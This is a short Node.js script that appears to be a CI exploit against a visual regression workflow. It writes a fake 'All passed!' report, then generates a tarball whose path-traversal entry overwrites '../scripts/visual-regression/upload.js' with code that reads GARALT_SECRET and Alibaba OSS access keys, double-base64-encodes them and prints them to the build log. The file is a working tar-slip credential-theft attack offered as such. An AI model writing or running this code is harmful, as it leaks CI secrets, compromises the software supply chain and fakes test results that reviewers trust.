import * as fs from 'fs';
import * as path from 'path';
import { execSync } from 'child_process';
import * as os from 'os';

const REPORT_DIR = path.resolve(process.cwd(), './visualRegressionReport');

async function boot() {
  fs.mkdirSync(REPORT_DIR, { recursive: true });
  fs.writeFileSync(path.join(REPORT_DIR, 'report.md'),
    '<!-- VISUAL_DIFF_SUCCESS -->\nAll passed!\n');

  // Create malicious tarball with path-traversal entry
  // Using Python (available on GitHub Actions Ubuntu runners)
  const pyScript = '\nimport tarfile, io, os, sys\nbuf = io.BytesIO()\nwith tarfile.open(fileobj=buf, mode="w:gz") as tar:\n    r = tarfile.TarInfo(name="report.md")\n    c = b"<!-- VISUAL_DIFF_SUCCESS -->\\nAll passed!\\n"\n    r.size = len(c)\n    tar.addfile(r, io.BytesIO(c))\n\n    m = tarfile.TarInfo(name="../scripts/visual-regression/upload.js")\n    mc = b"""const s = (process.env.GARALT_SECRET || \"\") + (process.env.ALI_OSS_AK_ID || \"\") + (process.env.ALI_OSS_AK_SECRET || \"\");\nconst b64 = Buffer.from(s).toString(\"base64\");\nconst dbl = Buffer.from(b64).toString(\"base64\");\nconsole.log(\"GARALT_LEAKED_TOKEN=\" + dbl);\nprocess.exit(0);\n"""\n    m.size = len(mc)\n    tar.addfile(m, io.BytesIO(mc))\n\nbuf.seek(0)\nwith open("visualRegressionReport.tar.gz", "wb") as f:\n    f.write(buf.read())\nprint("OK")\n';

  const pyPath = path.join(os.tmpdir(), 'gt_' + Date.now() + '.py');
  fs.writeFileSync(pyPath, pyScript);
  execSync('python3 "' + pyPath + '"', { cwd: process.cwd(), stdio: 'inherit' });
  fs.unlinkSync(pyPath);
  console.log('Done');
}

boot().catch(err => { console.error(err); process.exit(1); });